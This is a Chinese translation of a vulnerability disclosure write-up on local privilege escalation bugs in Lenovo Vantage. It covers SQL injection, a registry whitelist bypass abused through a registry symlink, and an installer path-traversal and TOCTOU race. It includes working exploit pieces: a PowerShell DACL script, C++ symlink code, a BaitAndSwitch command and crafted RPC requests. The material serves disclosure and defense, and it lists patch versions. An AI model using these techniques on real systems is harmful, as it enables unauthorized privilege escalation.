#  揭露 Lenovo Vantage 权限提升漏洞  
Bryan Alexander
                    Bryan Alexander  securitainment   2026-05-01 09:05  
  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">原文链接</span></section></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">作者</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">Bryan Alexander</span></section></td></tr></tbody></table>  
这篇文章详细介绍了 Atredis 在 Lenovo Vantage 中发现的多个权限提升漏洞。Lenovo Vantage 是 Lenovo 笔记本电脑预装的常见管理平台。文章将深入分析 Vantage 的架构，以及架构设计对所识别逻辑漏洞的影响范围与缓解措施的意义。以下 CVE 编号用于追踪上述问题：  
- CVE-2025-6230  
  
- CVE-2025-6231  
  
- CVE-2025-6232  
  
相关补丁已于 7 月 8 日发布，修复了全部发现的漏洞 ( LEN-196648 )。文末附有完整的漏洞披露时间表。  
## Lenovo Vantage  
### 架构  
  
Lenovo Vantage 预装于联想笔记本电脑，提供设备固件更新、参数配置及系统健康维护等功能。其整体设计遵循模块化与可插拔原则：核心 Vantage 服务以 SYSTEM 权限持续运行，各插件按需动态加载与卸载。所有组件均以 C# 编写，这使得逆向工程的难度大幅降低——MSIL (Microsoft Intermediate Language) 具备良好的伪代码可恢复性，分析人员可高效还原源码逻辑。下图展示了其整体架构：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nShCn23Xvx3wzibRlrNia61wk1jEDn0Tx2kGscMAY9K5TblruUBhOIprbZBzm5V4uTw2AbqcUoO5IPuABXWhs2piaicdUrz05UtK4yc/640?wx_fmt=png&from=appmsg "")  
  
Vantage 服务启动一个 RPC 端点，供插件和 GUI 客户端连接并提交请求。值得注意的是，插件本身同样对外暴露 RPC 端点，并通过 RPC 与 Vantage 服务进行双向通信。请求报文采用 JSON 格式，结构如下：  
```
{
"contract"    : "Target",
"command"     : "Command",
"payload"     : "EncodedPayload",
"targetAddin" : "Unused",
"clientId"    : "12",
"CallerPid"   : 12
}
```  
  
在实际分析中，我们观察到 Vantage 全程仅使用了前三个字段。  
  
Vantage 服务负责将请求路由至已注册的插件。各插件通过位于 %ProgramData%\Lenovo\Vantage\Addins  
目录下各自根文件夹中的 XML 文件进行描述。以 SmartInteractAddin  
为例，它对外暴露三个合约：  
```
<Contracts>
    <Contract name="SystemManagement.SmartGesture" />
    <Contract name="SystemManagement.PrecisionTouchPad" />
    <Contract name="SystemManagement.VisionProtection" />
  </Contracts>
```  
  
除合约定义外，插件 XML 文件还包含其他运行时配置，例如事件订阅与签名块。SmartInteractAddin  
的配置如下：  
```
<Addin name="SmartInteractAddin" version="1.0.3.64" isRollback="false" secondaryServer="false" noSWFlags="false" armReady="false" platform="MSIL" runas="user">
```  
  
其中，runas  
字段指定了插件的执行上下文。在 Vantage 支持的约 20 个插件中，有 5 个配置为在提升权限的上下文中运行。  
  
客户端向 Vantage 服务及其注册插件发起请求时，必须通过信任验证。Vantage 服务内置了一套基础身份验证机制，其执行流程如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgeiauIhHs8wrr2ib5JfPficoEV8TfSicMj4CF6VqJG36950OUm7CL91To5h8l9icrgtT8gBpbC0fdr0ug6lSMdU6mqqJCslBQRhm6E/640?wx_fmt=png&from=appmsg "")  
  
核心验证步骤是对客户端进程的数字签名进行校验。若程序集未由联想签名，则该客户端被判定为不受信任，请求随即被拒绝。这一策略被众多笔记本电脑厂商和软件供应商广泛采用，包括 Dell、Asus 和 Symantec，然而绕过该机制极为简单。我们迅速整理出三种可行方案：  
1. 利用常见的远程进程注入技术 (如 CreateRemoteThread  
)  
  
1. 定位某个从本地路径加载 DLL 的已签名联想二进制文件，执行 DLL 劫持  
  
1. 开发一个 UWP 应用  
  
经过评估，第二种方案最为简便。我们最终选用 FnhotkeyWidget.exe  
作为切入点，以获取对 RPC 端点的访问权限。该二进制文件会从本地路径加载若干 DLL，因此可通过将其复制到可写目录来实施劫持。随后，我们在该二进制文件的本地路径中放置一个名为 profapi.dll  
的 DLL，执行后即可在已签名二进制进程内获得代码执行能力。  
### 发送请求  
  
由于每个插件通过 RPC 与 Vantage 服务通信，Lenovo 开发了一个标准 RPC 客户端，以统一方式支持所有客户端调用。Lenovo.Vantage.RpcClient.dll  
是一个 C# DLL，封装了通用通信例程，并对不同架构提供透明支持。向 Vantage RPC 端点发送请求的用法如下：  
```
Dictionary<string, string>DiskSpaceRequest=newDictionary<string, string>()
{
    { "contract", "SystemOptimization.SystemUpdate" },
    { "command", "Get-FreeDiskSpace" },
};
stringrequestStr=JsonConvert.SerializeObject(DiskSpaceRequest);

RpcClientclient=newRpcClient();
stringtext=client.MakeRequest(requestStr, delegate(stringresponse)
{
    return Lenovo.Vantage.RpcCommon.RpcCallbackResult.Ok;
});
```  
  
通过上述方式，可以访问 Vantage RPC 端点及其已注册的插件接口。  
  
研究初期，我们首先对在提升权限上下文中运行的插件进行了合约枚举。在 20 个插件中，有 5 个以 SYSTEM 权限运行：CommercialAddin、LenovoAuthenticationAddin、LenovoHardwareScanAddin、LenovoSystemUpdateAddin 和 VantageCoreAddin。其中 VantageCoreAddin 是核心服务插件，随 Lenovo Vantage 持续运行，提供多种基础系统功能服务。我们以此为切入点展开分析，发现了两处问题。  
## CVE-2025-6230  
  
Atredis 发现的第一批漏洞位于 Vantage 服务的核心例程中。尽管几乎所有功能和请求处理器均通过插件实现，Vantage 本身仍存在若干核心合约。  
  
其中一个合约位于 VantageCoreAddin  
，负责处理主机上的基础功能，包括获取系统信息、发起蓝牙扫描以及更新插件设置数据库。其中一条支持的命令 Lenovo.Vantage.AddinSetting  
用于配置本地 Vantage 设置。这些设置存储在 C:\ProgramData\Lenovo\Vantage\Settings\LocalSettings.db  
的 SQLite 数据库中，仅 SYSTEM 账户可访问。  
  
处理 DeleteTable  
命令时，payload  
中应包含一个 JSON 数据包，携带待删除的表名，服务随后将该表从数据库中清除：  
```
using (SQLiteCommand sqliteCommand = LocalSettingsDb._dbConnection.CreateCommand())
{
string commandText = string.Format("drop table {0}", localSetting.Component) ?? "";
    sqliteCommand.CommandText = commandText;
    sqliteCommand.ExecuteNonQuery();
}
```  
  
与读写函数不同，此处对 localSetting.Component  
字段未执行任何清理操作，任意内容均可拼接至 SQL 查询。此外，尽管 SQLite 默认不支持堆叠查询，所使用的 .NET 库 (官方 SQLite 库) 却支持该特性，攻击者因此可执行任意数量的 SQL 查询。  
  
DeleteSetting  
处理器中存在第二处 SQL 注入：  
```
using SQLiteCommand sQLiteCommand = _dbConnection.CreateCommand();
string commandText = $"delete from {localSetting.Component} where Key=@key and UserName=@username" ?? "";
sQLiteCommand.Parameters.Add("@key", DbType.String).Value = localSetting.Key;
sQLiteCommand.Parameters.Add("@username", DbType.String).Value = localSetting.UserName;
sQLiteCommand.CommandText = commandText;
sQLiteCommand.ExecuteNonQuery();
```  
  
其中 key  
与 username  
字段已正确参数化，但 localSetting.Component  
字段未经清理或参数化，导致 SQL 注入。  
  
利用上述漏洞存在一定难度：尽管可通过堆叠查询传递任意 SQL，但用户定义函数 (UDF) 与扩展默认处于禁用状态，无法直接通过这些途径执行代码。攻击者可创建任意文件名的文件并影响其内容，但无法构造格式合规的文件。  
## CVE-2025-6232  
  
Atredis 发现的第三个漏洞更具研究价值。问题同样出在上述 Vantage 服务中，但触发点转移到了 Set-KeyChildren  
命令——该命令负责更新 HKCU\SOFTWARE\Lenovo  
下的用户注册表配置。服务中还存在配套的 Get-KeyChildren  
命令，但后者对注册表路径没有限制。传入请求首先被反序列化为 KeyChildrenRequest  
对象，结构大致如下：  
```
KeyChildrenRequest keyChildrenRequest =new KeyChildrenRequest
{
KeyList=newKeyList[]
    {
new KeyList
        {
Location=@"HKCU\SOFTWARE\Lenovo\Test",
KeyChildren=newKeyChild[]
            {
new KeyChild
                {
Type=RegistryKind.String,
Name="Test",
Value="Hello!"
                }
            }
        }
    }
};
```  
  
上述请求会在 HKCU\SOFTWARE\Lenovo\Test  
下写入字符串值 Test  
。在执行注册表写入前，VantageCoreAddin  
会先对 Location  
字段做白名单校验：  
```
privatestaticreadonlyIEnumerable<string>WhiteList=newList<string> { "HKCU\\SOFTWARE\\Lenovo" };
...
KeyList[] keyList=keyChildrenRequest.KeyList;
foreach (KeyListkeyinkeyList)
{
try
    {
if (WhiteList.Any((stringf) =>key.Location.IndexOf(f, StringComparison.OrdinalIgnoreCase) >=0))
        {
KeyChild[] keyChildren=key.KeyChildren;
foreach (KeyChildkeyChildinkeyChildren)
            {
RegistryQuery.WriteValue(key.Location, keyChild.Name, keyChild.Value, view64: true,
                                                           (RegistryValueType)keyChild.Type);
            }
        }
    }
...
```  
  
然而，该校验仅通过 IndexOf(..) >= 0  
判断白名单字符串是否出现在路径中，并未验证路径是否真正位于该位置之下。以下路径即可绕过校验：  
```
HKLM\SOFTWARE\Lenovo\HKCU\SOFTWARE\Lenovo
```  
  
由于白名单字符串作为子串存在于完整路径中，写入操作得以通过校验。通常情况下，非特权用户无法访问 HKLM 配置单元，因为对其的写入可能直接危及主机安全。但研究过程中，我们发现若干 Lenovo 专属键值对普通桌面用户开放了写权限：  
```
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Battery1
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\ExtremeBatteryLife
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Gadget
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Log
```  
  
上述四个键均由本地用户持有所有权，因此可被任意写入和修改：  
```
RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : a-pdx1\bja
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None
```  
  
需要指出，HKLM 下还存在其他对普通用户可写的键值，此处选用 Lenovo 路径主要是出于可移植性考虑。另外，由于 Microsoft 引入了一项安全缓解措施，禁止从非特权配置单元向特权配置单元创建符号链接，HKCU 到 HKLM 的直接符号链接无法建立 (详见此处) 。  
  
要完成漏洞利用，攻击者首先需要修改目标键值的 DACL，使其支持子键权限继承。在默认状态下，虽然 bja  
用户持有该键值的所有权并可创建子键，但子键不会继承父键权限 (参见上方 InheritanceFlags  
) 。这一步是后续利用的前提条件。可通过以下 PowerShell 脚本为所有者重建一个携带可继承权限的 DACL：  
```
$regPath="HKLM:\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Battery1"
$identity="a-pdx1\bja"

$acl=Get-Acl-Path$regPath
$existingRights=$null
foreach ($rulein$acl.Access) {
if ($rule.IdentityReference-eq$identity) {
$existingRights=$rule.RegistryRights
break
    }
}

$inheritanceFlags= [System.Security.AccessControl.InheritanceFlags]::ContainerInherit
$propagationFlags= [System.Security.AccessControl.PropagationFlags]::None
$accessRule=New-ObjectSystem.Security.AccessControl.RegistryAccessRule(
$identity,
$existingRights,
$inheritanceFlags,
$propagationFlags,
    [System.Security.AccessControl.AccessControlType]::Allow
)

$acl.AddAccessRule($accessRule)
Set-Acl-Path$regPath-AclObject$acl
```  
  
DACL 修改完成后，创建如下注册表路径：  
```
HKLM\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Battery1\HKCU\SOFTWARE\Lenovo
```  
  
最后，从上述路径向目标位置建立符号链接。以下 C++ 代码完成符号链接的创建，使后续写入重定向至 HKLM\SOFTWARE\Lenovo  
：  
```
void CreateRegSymlink()
{
   LSTATUS status = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                          L"SOFTWARE\\WOW6432Node\\Lenovo\\PWRMGRV\\ConfKeys\\Data\\Battery1\\HKCU\\SOFTWARE\\Lenovo\\Test",
0,
                          nullptr,
                      REG_OPTION_CREATE_LINK,
                          KEY_WRITE,
                          nullptr,
                          &hKey,
                          nullptr);
if (status != ERROR_SUCCESS)
  {
printf("Failed to create key: %08x\n", status);
return;
  }

  WCHAR path[] = L"\\REGISTRY\\MACHINE\\SOFTWARE\\Lenovo";
  status = RegSetValueEx(hKey, L"SymbolicLinkValue", 0, REG_LINK, (const BYTE*)path, wcslen(path) * sizeof(WCHAR));
if (status != ERROR_SUCCESS) {
printf("Failed to create symlink: %08x\n", status);
  }

RegCloseKey(hKey);
}
```  
  
此后，所有写入 HKLM\SOFTWARE\WOW6432Node\Lenovo\PWRMGRV\ConfKeys\Data\Battery1\HKCU\SOFTWARE\Lenovo\Test  
的注册表操作均会被实际写入 HKLM\SOFTWARE\Lenovo  
。  
  
利用该漏洞，攻击者可修改一个普通用户有权启动的现有服务的映像路径，从而以高权限执行任意二进制文件。  
## CVE-2025-6231  
  
Atredis 发现的第四个漏洞位于 LenovoSystemUpdateAddin  
组件中，该组件负责管理 Vantage 自身及其插件的更新，同时处理联想代管的第三方软件更新。此漏洞由两个逻辑缺陷复合而成：路径遍历与 TOCTOU，二者组合可触发本地权限提升 (LPE)。  
  
命令 Do-DownloadAndInstallAppComponent  
用于在联想 Vantage 内下载和安装第一方及第三方应用程序，支持五种独立操作模式：  
```
GetStatus,
GetLaunchPath,
DownloadOnly,
InstallOny,
DownloadAndInstall,
```  
  
其中，InstallOny  
(sic) 负责安装已存在于磁盘上的应用程序；DownloadOnly  
仅执行下载；DownloadAndInstall  
则同时完成两项操作。针对任意操作类型的请求，均会被反序列化为如下对象：  
```
Sending Requestspublic sealedclassDownloadAndInstallAppComponentRequest : Serialization<DownloadAndInstallAppComponentRequest>
{
    [JsonProperty("action")]
    [JsonConverter(typeof(StringEnumConverter))]
    [XmlElement("Action", IsNullable = false)]
public ActionType Action { get; set; }

    [JsonProperty("appID")]
    [XmlElement("AppID", IsNullable = false)]
publicstringAppID { get; set; }

    [JsonProperty("prerequisiteText")]
    [XmlElement("PrerequisiteText")]
publicstringPrerequisiteText { get; set; }

    [JsonProperty("moveTo")]
    [XmlElement("MoveTo")]
publicstringMoveTo { get; set; }

    [JsonProperty("continueDownloadWhileExit")]
    [XmlElement("ContinueDownloadWhileExit")]
publicstringContinueDownloadWhileExit { get; set; }

    [JsonProperty("appName")]
    [XmlElement("AppName")]
publicstringAppName { get; set; }
}
```  
  
从整体流程来看，InstallOny  
操作依次执行以下步骤：  
1. 验证并解析应用清单  
  
1. 验证应用安装文件的完整性  
  
1. 检测目标应用是否已有安装任务正在执行  
  
1. 提取并验证执行上下文 (用户、管理员、系统)  
  
1. 启动应用安装程序  
  
应用清单是一个 XML 文件，包含安装所需的元数据与指令，例如安装程序名称、启动路径、执行上下文等。其中关键字段是用于验证 XML 文件完整性的签名信息 (通过标准 Signature  
块实现) 。函数 GetAppInformation  
负责加载、验证和解析目标应用的清单，具体步骤如下：  
```
string text = string.Empty;
string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
"Lenovo\\Vantage\\AddinData\\LenovoSystemUpdateAddin\\GeneralDownload",
[0]     request.AppID, request.AppID + ".xml");
if (useCachedFile && File.Exists(text2))
{
[1]if (new XMLFileValidator().GetTrustStatus(text2).Equals(TrustStatus.FileTrusted))
    {
[2]text = File.ReadAllText(text2, Encoding.UTF8);
    }
}
else
{
    text = DownloadApplicationDescription(request.AppID, intermediateResponseFunction, token, ref response);
}
```  
  
上述代码中存在两处漏洞，均可导致加载不受信任的应用清单。  
  
第一处位于 [0]：清单路径直接由 request.AppID  
拼接生成，而该值来自请求本身，从未经过验证或净化。因此，攻击者可以构造恶意的 AppID，通过路径遍历跳转至任意目录：  
```
{ "AppID", "..\\..\\..\\..\\boo2\\MLeno" }
=> C:\boo2\MLeno.xml
```  
  
第二处位于 [1]：XMLFileValidator  
对 XML 文件执行签名验证，底层调用 Lenovo.CertificateValidation.Native.dll!ValidateXmlFile  
检查签名块。验证通过后，代码随即读取 XML 内容。由于清单路径已被替换为攻击者可控的位置，且验证与读取操作并非原子执行，攻击者可借助机会锁在两次操作之间修改 XML 文件内容。  
  
具体方法是使用开源工具 BaitAndSwitch  
：在初始的 XMLFileValidator  
读取 [1] 阶段，将符号链接指向受信任的清单文件；签名验证通过后，立即将符号链接切换为攻击者修改过的不受信任清单，供后续读取 [2] 使用：  
```
>BaitAndSwitch.exec:\boo2\MLeno.xmlc:\boo\MLenoReal.xmlc:\boo\MLenoMy.xmlrwdx
```  
  
将 AppID  
指向 boo2  
路径即可触发上述替换。以下请求可用于发起攻击：  
```
Dictionary<string, string> InstallAppPayload = new Dictionary<string, string>()
 {
     { "Action", "InstallOny" },
     { "AppID", "..\\..\\..\\..\\boo2\\MLeno" }
 };

 Dictionary<string, string> InstallAppDirect = new Dictionary<string, string>()
  {
      { "contract", "SystemOptimization.SystemUpdate" },
      { "command", "Do-DownloadAndInstallAppComponent" },
      { "payload", JsonConvert.SerializeObject(InstallAppPayload) }
  };

 RpcClient client = new RpcClient();
string text = client.MakeRequest(JsonConvert.SerializeObject(InstallAppDirect), delegate(string response)
 {
     Console.WriteLine($"progress response: {response}");
return Lenovo.Vantage.RpcCommon.RpcCallbackResult.Ok;
 });
```  
  
通过上述原语，攻击者获得了以未经验证的应用清单驱动后续安装流程的能力。  
  
在安装过程中，Vantage 依据应用清单决定各项配置，包括映像路径、启动参数、用户上下文等。此时存在多条可利用的提权路径。值得注意的是，尽管攻击者对清单拥有完全控制权，但仍无法直接执行任意可执行文件——限制并非来自签名校验，而是一项路径检查，约束了可启动可执行文件的来源目录。这一缓解措施存在可利用的边缘情况，属于弱防护，但在默认配置下确实收窄了攻击面。即便如此，其他提权路径依然存在。  
  
其中一条提权路径是将用户上下文设置为 Admin  
，此时 Vantage 通过 Powershell 启动安装程序：  
```
stringtext7= ((!string.IsNullOrEmpty(info.Install.CmdParameter?.Content)) ? ("-ArgumentList \""+info.Install.CmdParameter.Content+"\"") :string.Empty);
empty="exit (Start-Process -PassThru -Wait -FilePath \""+text+"\" "+text7+" -Verb runas).ExitCode";
empty2=Convert.ToBase64String(Encoding.Unicode.GetBytes(empty));
empty3=text3+" "+empty2+" "+text4;

returnProcessLauncher.LaunchUserProcess(text2, empty3, null, visible);
```  
  
info.Install.CmdParameter  
完全由攻击者控制，使用前不经任何验证。这条路径需要用户点击通过 UAC 提示，但实际启动的是合法安装程序。攻击者可在参数中注入第二个 Start-Process  
调用，修改可执行文件的执行环境（即搜索路径等运行时参数） ，或篡改安装程序的运行环境。  
  
第二条路径在 SYSTEM  
账户下执行。与管理员路径类似，此流程下命令参数同样不经验证，允许攻击者向安装程序或通过此路径启动的任意文件注入参数。我们注意到，应用程序服务器上提供了多种安装程序，包括 InstallBuilder、MSI 和 Inno Setup，这些安装程序均支持通过命令行参数配置安装行为。  
## 补丁更新  
  
Lenovo 已于 7 月 8 日针对上述漏洞发布补丁，系统将自动推送更新。如需确认补丁已完整安装，请核查以下插件的版本号：  
- VantageCoreAddin >= 1.0.0.199  
  
- LenovoSystemUpdateAddin >= 1.0.24.32  
  
插件版本可在各自的 XML 描述文件中查看，也可前往安装路径 C:\ProgramData\Lenovo\Vantage\Addins  
确认。  
  
最后，请确保以下组件均已更新至最新版本：  
- Lenovo Vantage >= 10.2501.20.0  
  
- Lenovo Commercial Vantage >= 20.2506.39.0  
  
## 时间线  
- 2025-04-25：Atredis Partners 向厂商发送初步通知，随附漏洞公告草稿  
  
- 2025-04-25：Lenovo 确认收到公告，并提供内部跟踪编号  
  
- 2025-05-19：Lenovo 通报修复进展，并将初步补丁发布日期定为 2025-07-08  
  
- 2025-06-12：Lenovo 询问复测事宜，并就研究发现提出补充问题  
  
- 2025-06-27：Lenovo 提供 CVE 编号及复测相关信息  
  
- 2025-07-08：Lenovo 发布补丁及漏洞公告  
  
- 2025-07-09：Atredis 发布公开博客文章  
  
---  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
>   
  
  
